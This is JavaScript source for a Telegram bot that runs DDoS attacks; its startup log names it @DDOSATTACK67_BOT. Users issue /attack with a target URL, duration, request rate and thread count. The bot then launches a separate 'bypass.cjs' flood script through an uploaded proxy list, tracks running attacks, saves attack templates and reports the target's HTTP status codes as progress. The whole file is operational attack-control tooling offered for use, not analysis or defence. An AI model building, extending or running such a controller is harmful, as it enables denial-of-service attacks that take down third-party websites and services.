import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();
console.log('📁 Loading .env file...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN not found!');
    process.exit(1);
}
console.log('✅ Token loaded successfully');

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';

// Configuration
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 2,
    UPDATE_INTERVAL: 5000,
    MAX_PROXY_LINES: 1000
};

// Store running attacks
const attacks = new Map();
const templates = new Map();
const schedule = new Map();

// ========== HEALTH CHECK SERVER ==========
const app = express();
const port = process.env.PORT || 3000;
const HOST = '::';

app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <head><title>Telegram Bypass Bot</title></head>
            <body style="font-family:Arial;text-align:center;padding:50px;">
                <h1>🤖 Telegram Bypass Bot</h1>
                <p>Status: <span style="color:green;">● RUNNING</span></p>
                <p>Active Attacks: ${attacks.size}</p>
            </body>
        </html>
    `);
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        attacks: attacks.size,
        running: countRunningAttacks()
    });
});

app.listen(port, HOST, () => {
    console.log(`🌐 Health check on port ${port}`);
});

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    return num?.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") || "0";
}

function getStatusEmoji(status) {
    if (status >= 200 && status < 300) return '✅';
    if (status >= 400 && status < 500) return '❌';
    if (status >= 500) return '⚠️';
    return '🔄';
}

function createProgressBar(percent, size = 10) {
    const filled = Math.floor(percent / size);
    return '🟩'.repeat(filled) + '⬜'.repeat(size - filled);
}

function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        return content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
    } catch {
        return [];
    }
}

// ========== BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.reply(
        `🔥 *ULTIMATE BYPASS CONTROLLER* 🔥\n\n` +
        `👋 Welcome, ${ctx.from.first_name}!\n` +
        `📊 Status: 🟢 Online\n` +
        `👑 Role: ${isAdmin ? '⭐ Admin' : '👤 User'}\n\n` +
        `📌 *Commands:*\n` +
        `├ /attack \`<url> <time> <rate> <threads>\`\n` +
        `├ /stop \`<id>\`\n` +
        `├ /list\n` +
        `├ /stats\n` +
        `├ /save \`<name> <url> <time> <rate> <threads>\`\n` +
        `├ /load \`<name>\`\n` +
        `├ /setproxy\n` +
        `└ /help`,
        { parse_mode: 'Markdown' }
    );
});

bot.help((ctx) => {
    ctx.reply(
        `📚 *COMMANDS*\n\n` +
        `🎯 *Attack*\n` +
        `/attack \`<url> <time> <rate> <threads>\`\n` +
        `Ex: \`/attack https://example.com 30 50 5\`\n\n` +
        `🛑 *Control*\n` +
        `/stop \`<id>\`\n` +
        `/list\n` +
        `/stats\n\n` +
        `📋 *Templates*\n` +
        `/save \`<name> <url> <time> <rate> <threads>\`\n` +
        `/load \`<name>\`\n` +
        `/templates\n\n` +
        `🔄 *Proxy*\n` +
        `/setproxy\n` +
        `/proxylist\n\n` +
        `👑 *Admin*\n` +
        `/stopall`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('test', (ctx) => ctx.reply('✅ Bot is working!'));

// ========== ATTACK COMMAND WITH CRASH PROTECTION ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads>');
    }

    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ Max concurrent attacks reached');
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ bypass.cjs not found!');
    }

    const proxies = loadAndCleanProxies();
    const attackId = Date.now().toString();
    const duration = parseInt(time);
    const startTime = Date.now();

    const statusMsg = await ctx.reply(
        `🚀 *Attack Started*\n\n` +
        `ID: \`${attackId}\`\n` +
        `Target: ${url}\n` +
        `Duration: ${time}s\n` +
        `Rate: ${rate}/s\n` +
        `Threads: ${threads}\n` +
        `Proxies: ${proxies.length}\n\n` +
        `${createProgressBar(0)} 0%`,
        { parse_mode: 'Markdown' }
    );

    // Spawn attack with crash protection
    const attack = spawn('node', [
        'bypass.cjs',
        url,
        time,
        rate,
        threads,
        'proxy.txt'
    ]);

    // Store attack info
    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        rate: parseInt(rate),
        threads: parseInt(threads),
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        statusCodes: {},
        isRunning: true
    });

    // Parse output
    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.statusCodes[code] = numCount;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
            }
        }
    });

    // Log errors but don't crash
    attack.stderr.on('data', (data) => {
        console.error(`[${attackId}] Error:`, data.toString());
    });

    // Handle process errors
    attack.on('error', (err) => {
        console.error(`[${attackId}] Process error:`, err.message);
        ctx.reply(`⚠️ Attack error: ${err.message}`);
        attacks.delete(attackId);
    });

    // Progress updates
    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        
        const successRate = attackData.requestCount > 0 
            ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
            : 0;
        
        const topCodes = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}:${count}`)
            .join(' ');

        const progressBar = createProgressBar(percent);
        
        const updateMessage = 
            `🚀 *Attack Running*\n\n` +
            `ID: \`${attackId}\`\n` +
            `${progressBar} ${percent}%\n` +
            `⏱️ ${elapsed}s/${attackData.duration}s\n` +
            `📊 Req: ${formatNumber(attackData.requestCount)}\n` +
            `✅ ${formatNumber(attackData.successCount)} (${successRate}%)\n` +
            `❌ ${formatNumber(attackData.failCount)}\n` +
            `🔍 ${topCodes || 'Collecting...'}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
    }, CONFIG.UPDATE_INTERVAL);

    // Handle completion/crash
    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        
        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const successRate = attackData.requestCount > 0 
            ? Math.round((attackData.successCount / attackData.requestCount) * 100) 
            : 0;
        
        let statusEmoji = code === 0 ? '✅' : '⚠️';
        let statusText = code === 0 ? 'Completed' : `Crashed (code ${code})`;
        
        const codeBreakdown = Object.entries(attackData.statusCodes)
            .map(([code, count]) => `${getStatusEmoji(parseInt(code))} ${code}:${count}`)
            .join('\n');

        const finalMessage = 
            `${statusEmoji} *Attack ${statusText}*\n\n` +
            `ID: \`${attackId}\`\n` +
            `⏱️ ${elapsed}s/${attackData.duration}s\n\n` +
            `📊 *Stats*\n` +
            `Total: ${formatNumber(attackData.requestCount)}\n` +
            `✅ Success: ${formatNumber(attackData.successCount)} (${successRate}%)\n` +
            `❌ Failed: ${formatNumber(attackData.failCount)}\n\n` +
            `🔍 *Codes*\n${codeBreakdown || 'No data'}`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });

    // Timeout protection
    setTimeout(() => {
        if (attacks.has(attackId)) {
            attack.kill('SIGKILL');
            ctx.reply(`⚠️ Attack ${attackId} timed out`);
            attacks.delete(attackId);
        }
    }, (duration + 30) * 1000);
});

// ========== STOP COMMAND ==========
bot.command('stop', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) return ctx.reply('❌ Attack not found');
    
    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Not your attack');
    }

    attack.process.kill('SIGINT');
    ctx.reply(`🛑 Attack ${attackId} stopped`);
});

// ========== LIST COMMAND ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) return ctx.reply('📊 No active attacks');

    let msg = '📊 *Active Attacks*\n\n';
    attacks.forEach((a, id) => {
        if (!a.isRunning) return;
        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
        msg += `\`${id.slice(-6)}\` @${a.username} - ${elapsed}s\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== STATS COMMAND ==========
bot.command('stats', (ctx) => {
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const proxyCount = fs.existsSync('proxy.txt') 
        ? fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(l => l.includes(':')).length 
        : 0;
    
    ctx.reply(
        `📊 *Stats*\n\n` +
        `Running: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `Total Attacks: ${attacks.size}\n` +
        `Total Requests: ${formatNumber(totalReqs)}\n` +
        `Proxies: ${proxyCount}\n` +
        `Uptime: ${Math.floor(process.uptime() / 60)}m`,
        { parse_mode: 'Markdown' }
    );
});

// ========== TEMPLATES ==========
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /save <name> <url> <time> <rate> <threads>');
    }
    
    templates.set(name, { url, time, rate, threads });
    ctx.reply(`✅ Template saved: ${name}`);
});

bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) return ctx.reply('❌ Template not found');
    
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

bot.command('templates', (ctx) => {
    if (templates.size === 0) return ctx.reply('📭 No templates');
    
    let msg = '📋 *Templates*\n\n';
    templates.forEach((data, name) => {
        msg += `\`${name}\`: ${data.url} (${data.time}s)\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROXY ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Unauthorized');
    }
    ctx.reply('📤 Send proxy.txt file');
});

bot.command('proxylist', (ctx) => {
    if (!fs.existsSync('proxy.txt')) {
        return ctx.reply('📭 No proxy file');
    }
    
    const proxies = loadAndCleanProxies();
    ctx.reply(
        `📊 *Proxies*\n\n` +
        `Total: ${proxies.length}\n` +
        `Sample: ${proxies.slice(0, 3).join('\n')}`,
        { parse_mode: 'Markdown' }
    );
});

// ========== FILE HANDLER ==========
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing...');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ Loaded ${proxies.length} proxies`
            );
        } catch (error) {
            ctx.reply('❌ Failed: ' + error.message);
        }
    }
});

// ========== STOP ALL ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const count = attacks.size;
    attacks.forEach((a) => {
        if (a.isRunning) a.process.kill('SIGINT');
    });
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// ========== ERROR HANDLING ==========
bot.catch((err) => {
    console.error('Bot error:', err);
});

// ========== START BOT ==========
bot.launch()
    .then(() => {
        console.log('✅ Bot is running!');
        console.log('📱 Send /start to @DDOSATTACK67_BOT');
    })
    .catch(err => {
        console.error('❌ Failed:', err.message);
    });

console.log('\n╔════════════════════════════╗');
console.log('║  🔥 BYPASS CONTROLLER     ║');
console.log('╠════════════════════════════╣');
console.log(`║  👑 Admin: ${ADMIN_ID}        ║`);
console.log('╚════════════════════════════╝');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));